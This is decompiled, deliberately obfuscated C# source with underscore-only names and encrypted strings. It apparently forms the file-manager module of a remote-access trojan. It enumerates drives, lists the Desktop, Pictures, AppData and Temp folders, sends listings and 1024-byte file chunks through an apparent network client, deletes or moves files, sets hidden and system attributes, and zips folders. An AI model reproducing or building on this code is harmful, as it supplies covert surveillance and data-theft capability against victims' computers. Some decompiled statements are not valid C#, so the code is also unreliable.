using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.VisualBasic.MyServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;

[StandardModule]
internal sealed class ____________________
{
	public static void _()
	{
		int num = 0;
		int num1 = 0;
		string[] str = null;
		int length;
		int length1;
	Label5:
		DirectoryInfo directoryInfo = new DirectoryInfo(______________________._____);
		FileInfo[] files = directoryInfo.GetFiles(<Module>.___<string>(-286239852));
		int num2 = -8110;
		if (num1 / 33554432 == -8927)
		{
			goto Label0;
		}
		num = 0;
	Label6:
		if (num >= checked((int)files.Length))
		{
			return;
		}
		FileInfo fileInfo = files[num];
		num2 = 18961;
		if (Type.EmptyTypes.Length + -8110 == -8110)
		{
			if (fileInfo.Name.Contains(<Module>.____<string>(511728657)))
			{
				goto Label2;
			}
			str = new string[] { <Module>.___<string>(1348140809), null, null, null, null, null, null, null, null };
			num2 = ((<Module>.______________ / 67108864 - 8380 & 467152128) == 467143936 ? Type.EmptyTypes.Length + -2832 : Type.EmptyTypes.Length + 1430308613);
			length = Type.EmptyTypes.Length + 2;
		}
		else
		{
			goto Label1;
		}
	Label7:
		while (true)
		{
			switch (length)
			{
				case 0:
				{
					str[5] = fileInfo.FullName.ToString();
					str[6] = <Module>.______<string>(861631917);
					if ((-(6143 | <Module>.______________) ^ -6300) != 0)
					{
						length1 = Type.EmptyTypes.Length + 8860;
					}
					else if ((4096 * <Module>.C | -12) != -12)
					{
						length1 = (num1 / 134217728 - 565182464 == 131072 * num1 * 1697536 ? Type.EmptyTypes.Length + -1248140325 : Type.EmptyTypes.Length + 765078657);
					}
					else
					{
						length1 = (int)(sizeof(double) + -1751482585);
					}
					num2 = length1;
					length = Type.EmptyTypes.Length + 1;
					continue;
				}
				case 1:
				{
					break;
				}
				default:
				{
					goto Label3;
				}
			}
		}
		str[7] = fileInfo.Length.ToString();
		if (num2 == 18376)
		{
			goto Label5;
		}
		str[8] = <Module>.____<string>(974621068);
		______________________________________________________________.___________(string.Concat(str));
	Label0:
		Thread.Sleep(3000);
		num++;
		goto Label6;
	Label1:
		str[3] = fileInfo.Name;
		str[4] = <Module>._____<string>(1143046530);
		length = Type.EmptyTypes.Length + 0;
		goto Label7;
	Label2:
		______________________________________________________________._________________(fileInfo.FullName.ToString(), <Module>.___<string>(1408750413), 1024, 0);
		if ((<Module>.___________ % 1072250382 | -1073741825) == -1073741825)
		{
			if (num2 == -14222)
			{
				goto Label1;
			}
			goto Label0;
		}
		else
		{
			goto Label0;
		}
	Label3:
		while (true)
		{
			str[1] = ______________________________________________________________.________________________;
			str[2] = <Module>.______<string>(861631917);
			if ((num1 % 33 | -1857) == -1857)
			{
				if (num2 == -2832)
				{
					goto Label1;
				}
			}
		}
	}

	public static void __(string string_0, string string_1, bool bool_0)
	{
		try
		{
			if (File.Exists(string_0))
			{
				C.bzA.FileSystem.CopyFile(string_0, string_1);
				Type.EmptyTypes.Length + 26228 == 26228;
				if (bool_0)
				{
					File.Delete(string_0);
				}
				______________________________________________________________.______________(<Module>.______<string>(1086631811), string.Concat(<Module>.______<string>(-1305594801), string_0));
			}
			if (Directory.Exists(string_0))
			{
				Directory.Move(string_0, string_1);
				if (bool_0)
				{
					C.bzA.FileSystem.DeleteDirectory(string_0, DeleteDirectoryOption.DeleteAllContents);
				}
				______________________________________________________________.______________(<Module>.______<string>(1086631811), string.Concat(<Module>._____<string>(807135730), string_0));
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.___<string>(-1535373923), string.Concat(<Module>.______<string>(682011996), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static void ___(string string_0)
	{
		try
		{
			if (!File.Exists(string_0))
			{
				File.WriteAllText(string_0, <Module>.__________(Type.EmptyTypes.Length + 2225, Type.EmptyTypes.Length + 3257, Type.EmptyTypes.Length + 203));
				______________________________________________________________.______________(<Module>.___<string>(-1535373923), string.Concat(<Module>.___<string>(-264650886), string_0));
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.______<string>(1086631811), string.Concat(<Module>.____<string>(-1612929305), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static void ____(string string_0)
	{
		try
		{
			if (!Directory.Exists(string_0))
			{
				Directory.CreateDirectory(string_0);
				______________________________________________________________.______________(<Module>.___<string>(-1535373923), string.Concat(<Module>.______<string>(640561245), string_0));
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>._____<string>(-1182547814), string.Concat(<Module>._____<string>(1632167111), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static void _____(string string_0, string string_1)
	{
		FileInfo attributes;
		FileInfo fileInfo;
		FileAttributes fileAttribute;
		uint num;
		try
		{
			fileInfo = new FileInfo(string_0);
			fileAttribute = new FileAttributes();
			if (Operators.CompareString(string_1, <Module>.____<string>(1467947727), false) != 0)
			{
				goto Label0;
			}
			num = sizeof(int) + -4;
		Label4:
			switch (num)
			{
				case 1:
				{
					fileAttribute = FileAttributes.Hidden;
					goto Label1;
				}
				case 2:
				{
					goto Label3;
				}
				case 3:
				{
					fileAttribute = FileAttributes.ReadOnly;
					if (Operators.CompareString(string_1, <Module>.____<string>(-368404793), false) == 0)
					{
						fileAttribute = FileAttributes.NotContentIndexed;
					}
					if (Operators.CompareString(string_1, <Module>._____<string>(-693427233), false) != 0)
					{
						attributes = fileInfo;
						attributes.Attributes = (FileAttributes)((int)attributes.Attributes + (int)fileAttribute);
					}
					______________________________________________________________.______________(<Module>._____<string>(-1182547814), string.Concat(<Module>.___<string>(562294604), string_0));
					return;
				}
				default:
				{
					fileInfo.Attributes = FileAttributes.Normal;
					break;
				}
			}
		Label0:
			if (Operators.CompareString(string_1, <Module>.____<string>(-64882227), false) != 0)
			{
				goto Label1;
			}
			num = sizeof(uint) + -3;
			goto Label4;
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			<Module>.____________ = -805702749;
			______________________________________________________________.______________(<Module>._______<string>(-1515210120), string.Concat(<Module>.___<string>(-2018172108), exception.ToString()));
			ProjectData.ClearProjectError();
		}
		return;
	Label1:
		if (Operators.CompareString(string_1, <Module>.___<string>(1268020886), false) != 0)
		{
			goto Label5;
		}
	Label3:
		fileAttribute = FileAttributes.System;
		goto Label5;
		if (Operators.CompareString(string_1, <Module>.____<string>(-368404793), false) == 0)
		{
			fileAttribute = FileAttributes.NotContentIndexed;
		}
		if (Operators.CompareString(string_1, <Module>._____<string>(-693427233), false) != 0)
		{
			attributes = fileInfo;
			attributes.Attributes = (FileAttributes)((int)attributes.Attributes + (int)fileAttribute);
		}
		______________________________________________________________.______________(<Module>._____<string>(-1182547814), string.Concat(<Module>.___<string>(562294604), string_0));
		return;
	Label5:
		if (Operators.CompareString(string_1, <Module>.___<string>(1973747168), false) == 0)
		{
		}
		else
		{
			if (Operators.CompareString(string_1, <Module>.____<string>(-368404793), false) == 0)
			{
				fileAttribute = FileAttributes.NotContentIndexed;
			}
			if (Operators.CompareString(string_1, <Module>._____<string>(-693427233), false) != 0)
			{
				attributes = fileInfo;
				attributes.Attributes = (FileAttributes)((int)attributes.Attributes + (int)fileAttribute);
			}
			______________________________________________________________.______________(<Module>._____<string>(-1182547814), string.Concat(<Module>.___<string>(562294604), string_0));
			return;
		}
		num = sizeof(byte) + 2;
		goto Label4;
	}

	public static void ______(string string_0, string string_1)
	{
		byte[] numArray;
		int length;
		object objectValue;
		object[] string0;
		int num = 0;
		object obj;
		try
		{
			object objectValue1 = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(Type.GetTypeFromProgID(<Module>._______<string>(-1805104858))));
			numArray = new byte[22];
			length = Type.EmptyTypes.Length + -14614;
			obj = Type.EmptyTypes.Length + 8;
		Label6:
			while (true)
			{
				switch (obj)
				{
					case 0:
					{
						numArray[18] = 0;
						numArray[19] = 0;
						obj = sizeof(Guid) + -13;
						continue;
					}
					case 1:
					{
						FileSystem.WriteAllBytes(string_1, numArray, false);
						string str = <Module>._______<string>(698400352);
						string0 = new object[] { string_0 };
						objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue1, null, str, string0, null, null, null));
						if (length == 15237)
						{
							if ((-536870912 * num ^ 26092) != 0)
							{
								goto Label3;
							}
							goto case 7;
						}
						else
						{
							goto case 7;
						}
					}
					case 2:
					{
						numArray[6] = 0;
						numArray[7] = 0;
						int _______ = <Module>.____________;
						if (((_______ >> 12) % 917991 >> 1) - 268435456 != _______ / 14885199)
						{
							obj = Type.EmptyTypes.Length + 6;
							continue;
						}
						else if (num - 6948 - 4482 != num << 7 >> 7)
						{
							obj = Type.EmptyTypes.Length + -1439604096;
							continue;
						}
						else
						{
							obj = sizeof(double) + 1725204709;
							continue;
						}
					}
					case 3:
					{
						numArray[20] = 0;
						numArray[21] = 0;
						length = (int)(sizeof(ushort) + 15235);
						obj = Type.EmptyTypes.Length + 1;
						continue;
					}
					case 4:
					{
						goto Label0;
					}
					case 5:
					{
						numArray[14] = 0;
						numArray[15] = 0;
						goto case 7;
					}
					case 6:
					{
						goto Label1;
					}
					case 7:
					{
						numArray[16] = 0;
						numArray[17] = 0;
						obj = sizeof(Guid) + -16;
						continue;
					}
					case 8:
					{
						do
						{
							numArray[0] = 80;
							numArray[1] = 75;
							num = length;
							length = 831;
							if (num != -14614)
							{
								goto case 0;
							}
							if ((32 & (2048 * num ^ 4 * ((num << 23) + 8180))) == 0)
							{
								numArray[2] = 5;
								numArray[3] = 6;
							}
							else
							{
								goto case 0;
							}
						}
						while (length == 3556);
						numArray[4] = 0;
						numArray[5] = 0;
						obj = sizeof(byte) + 1;
						continue;
					}
					default:
					{
						goto case 8;
					}
				}
			}
		Label3:
			string str1 = <Module>.____<string>(1946057262);
			string0 = new object[] { string_1 };
			object obj1 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue1, null, str1, string0, null, null, null));
			string str2 = <Module>.____<string>(1339012130);
			string0 = new object[] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, <Module>.___<string>(1449849698), new object[0], null, null, null)), 4 };
			NewLateBinding.LateCall(obj1, null, str2, string0, null, null, null, true);
			______________________________________________________________.______________(<Module>._______<string>(-1515210120), string.Concat(<Module>._______<string>(-1586014666), string_1));
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.___<string>(-1535373923), string.Concat(<Module>._____<string>(-75117445), exception.ToString()));
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
		numArray[10] = 0;
		numArray[11] = 0;
		if (-(length * 771 + 253 * length) != -1446)
		{
			if (length == 27711)
			{
				goto Label1;
			}
		}
		numArray[12] = 0;
		numArray[13] = 0;
		obj = Type.EmptyTypes.Length + 5;
		goto Label6;
	Label1:
		numArray[8] = 0;
		numArray[9] = 0;
		length = (int)(sizeof(long) + -5401);
		goto Label0;
	}

	public static void _______(string string_0, string string_1)
	{
		try
		{
			_____________________ ___________ = new _____________________()
			{
				__ = string_0,
				_ = string_1
			};
			_____________________ ___________1 = ___________;
			(new Thread(new ThreadStart(___________1._))).Start();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ________()
	{
		IEnumerator<DriveInfo> enumerator = null;
		string[] name = null;
		try
		{
			<Module>._______ = name;
			using (string str = <Module>.___<string>(1631678510))
			{
				enumerator = C.bzA.FileSystem.Drives.GetEnumerator();
				while (enumerator.MoveNext())
				{
					DriveInfo current = enumerator.Current;
					try
					{
						name = new string[] { str, null, null, null, null, null, null, null };
						int num = -14210;
						if (sizeof(ushort) + -1877 != 31947)
						{
						}
						while (true)
						{
							name[1] = <Module>._____<string>(-1125326020);
							name[2] = current.Name;
							if (num == -14210)
							{
								if ((num * -939524096 & 134209227) == 0)
								{
									break;
								}
							}
						}
						name[3] = <Module>._______<string>(1136580736);
						name[4] = ____________________.____________(current.AvailableFreeSpace);
						name[5] = <Module>._______<string>(492003881);
						name[6] = ____________________.____________(current.TotalSize);
						name[7] = <Module>._______<string>(1974200954);
						str = string.Concat(name);
					}
					catch (Exception exception)
					{
						ProjectData.SetProjectError(exception);
						ProjectData.ClearProjectError();
					}
				}
			}
			______________________________________________________________.____________(str);
		}
		catch (Exception exception2)
		{
			ProjectData.SetProjectError(exception2);
			Exception exception1 = exception2;
			<Module>.____________ = 1987339265;
			______________________________________________________________.______________(<Module>.___<string>(-1535373923), string.Concat(<Module>.____<string>(-945015677), exception1.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static void _________(string string_0)
	{
		DateTime creationTime;
		string[] name = null;
		int num = 0;
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			string str = string.Concat(<Module>._____<string>(-318750240), string_0, <Module>._______<string>(1974200954));
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			for (int i = 0; i < checked((int)directories.Length); i++)
			{
				DirectoryInfo directoryInfo1 = directories[i];
				try
				{
					if ((14 & 13 * i + i * 19 - 2910) == 2)
					{
						name = new string[] { str, null, null, null, null, null };
						num = 14150;
						name[1] = <Module>.______<string>(-1386531692);
						name[2] = directoryInfo1.Name;
					}
					name[3] = <Module>.______<string>(1254399426);
					creationTime = directoryInfo1.CreationTime;
					name[4] = creationTime.ToString();
					name[5] = <Module>._______<string>(1974200954);
					str = string.Concat(name);
				}
				catch (Exception exception)
				{
					ProjectData.SetProjectError(exception);
					ProjectData.ClearProjectError();
				}
			}
			FileInfo[] files = directoryInfo.GetFiles(<Module>.____<string>(-1126801251));
			for (int j = 0; j < checked((int)files.Length); j++)
			{
				FileInfo fileInfo = files[j];
				try
				{
					num - 1751415339 - 247 != 8741 + num;
					name = new string[] { str, null, null, null, null, null, null };
					int length = Type.EmptyTypes.Length + 1;
					while (true)
					{
						switch (length)
						{
							case 0:
							{
								break;
							}
							case 1:
							{
								name[1] = fileInfo.Name;
								name[2] = <Module>.___<string>(956658278);
								length = Type.EmptyTypes.Length + 0;
								continue;
							}
							default:
							{
								goto case 1;
							}
						}
					}
					name[3] = ____________________.____________(fileInfo.Length).ToString();
					name[4] = <Module>._______<string>(-145896420);
					creationTime = fileInfo.CreationTime;
					name[5] = creationTime.ToString();
					name[6] = <Module>.____<string>(-1286171096);
					str = string.Concat(name);
				}
				catch (Exception exception1)
				{
					ProjectData.SetProjectError(exception1);
					ProjectData.ClearProjectError();
				}
			}
			______________________________________________________________.____________(str);
		}
		catch (Exception exception3)
		{
			ProjectData.SetProjectError(exception3);
			Exception exception2 = exception3;
			______________________________________________________________.______________(<Module>.______<string>(1086631811), string.Concat(<Module>.______<string>(-385819835), string_0, <Module>._____<string>(2106542073), exception2.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static void __________(string string_0)
	{
		int num = 0;
		int num1 = 0;
		object length;
		try
		{
			string string0 = string_0;
			if (Operators.CompareString(string0, <Module>.______<string>(-747024288), false) == 0)
			{
				if ((-8239104 * num1 / 251 ^ 536874829) != 0)
				{
					goto Label2;
				}
				if (1048576 * num + 293056 == num * 7560192 << 2)
				{
					length = Type.EmptyTypes.Length + 388143003;
				}
				else
				{
					length = sizeof(short) + -1480917317;
				}
			}
			else if (Operators.CompareString(string0, <Module>.______<string>(920828807), false) == 0)
			{
				length = Type.EmptyTypes.Length + 3;
			}
			else if (Operators.CompareString(string0, <Module>._____<string>(1056333498), false) != 0)
			{
				if (Operators.CompareString(string0, <Module>.___<string>(-272965474), false) == 0)
				{
					goto Label3;
				}
				if (Operators.CompareString(string0, <Module>._______<string>(-574721360), false) == 0)
				{
					num1 = 30865;
					if (((-3 | -(num & 3272)) != -3 ? Type.EmptyTypes.Length + 2128221406 : 27340) == 27340)
					{
						____________________._________(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
						return;
					}
					else
					{
						____________________._________(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
						return;
					}
				}
				else if (Operators.CompareString(string0, <Module>.___<string>(-1745027642), false) != 0)
				{
					if (Operators.CompareString(string0, <Module>._______<string>(-1853860239), false) == 0)
					{
						____________________._________(Environment.GetEnvironmentVariable(<Module>.______<string>(239870652)));
					}
					return;
				}
				else
				{
					____________________._________(Path.GetTempPath());
					return;
				}
			}
			else if (-268435456 + (num1 >> 22) % 749 == (4370 & num1) * 8388608)
			{
				length = Type.EmptyTypes.Length + -1697326021;
			}
			else if ((num1 * 4190208 + 3919 | -3728) == -129)
			{
				length = ((num % 7565623 ^ 16779644) != 0 ? Type.EmptyTypes.Length + 1 : Type.EmptyTypes.Length + -1755272948);
			}
			else
			{
				length = Type.EmptyTypes.Length + -2081031492;
			}
		Label4:
			switch (length)
			{
				case 0:
				{
					____________________._________(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
					return;
				}
				case 1:
				{
					____________________._________(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
					return;
				}
				case 3:
				{
					____________________._________(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
					return;
				}
			}
		Label2:
			____________________._________(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return;
	Label3:
		length = Type.EmptyTypes.Length + 0;
		goto Label4;
	}

	public static void ___________(string string_0)
	{
		try
		{
			if (File.Exists(string_0))
			{
				C.bzA.FileSystem.DeleteFile(string_0);
				switch (Type.EmptyTypes.Length)
				{
					default:
					{
						______________________________________________________________.______________(<Module>._____<string>(-1182547814), string.Concat(<Module>.___<string>(1844213372), string_0));
						break;
					}
				}
			}
			if (Directory.Exists(string_0))
			{
				C.bzA.FileSystem.DeleteDirectory(string_0, DeleteDirectoryOption.DeleteAllContents);
				______________________________________________________________.______________(<Module>.______<string>(1086631811), string.Concat(<Module>.___<string>(-716743021), string_0));
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>._______<string>(-1515210120), string.Concat(<Module>.______<string>(226053735), string_0, <Module>.____<string>(748004036), exception.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static string ____________(long long_0)
	{
		string str;
		object length;
		try
		{
			string[] strArrays = new string[] { <Module>.______<string>(-1455616277), null, null, null, null, null, null, null, null };
			int num = -19602;
			if (sizeof(int) + -3049 == -3045)
			{
				strArrays[1] = <Module>.____<string>(603851315);
				strArrays[2] = <Module>._____<string>(1562054689);
				int num1 = ___________._;
				num = Type.EmptyTypes.Length + -16868;
				if ((72131 ^ num1 % 6306) == 0)
				{
					length = sizeof(long) + 1298427267;
				}
				else
				{
					length = Type.EmptyTypes.Length + 0;
				}
				switch (length)
				{

				}
			}
			strArrays[3] = <Module>._______<string>(813962615);
			strArrays[4] = <Module>._______<string>(-1360907307);
			int num2 = num;
			num = -25262;
			if (num2 == 18093)
			{
				if ((num2 / 4096 & -1048576) == 0)
				{
					goto Label0;
				}
			}
			do
			{
				strArrays[5] = <Module>.____<string>(-1232501205);
				strArrays[6] = <Module>.____<string>(1529636137);
				int _________ = <Module>._________________;
				if (_________ % 1195 - _________ * -1275068416 == -1135615528)
				{
					goto Label0;
				}
			}
			while (num == 9622);
		Label0:
			strArrays[7] = <Module>.______<string>(-482538254);
			strArrays[8] = <Module>._____<string>(-1926336827);
			string[] strArrays1 = strArrays;
			double num3 = Math.Floor(Math.Log((double)long_0, 1024));
			str = string.Concat(Math.Round((double)long_0 / Math.Pow(1024, num3), 2), <Module>.____<string>(1226113571), strArrays1[(int)Math.Round(num3)]).ToString();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			str = <Module>._____<string>(1521433505);
			ProjectData.ClearProjectError();
		}
		return str;
	}
}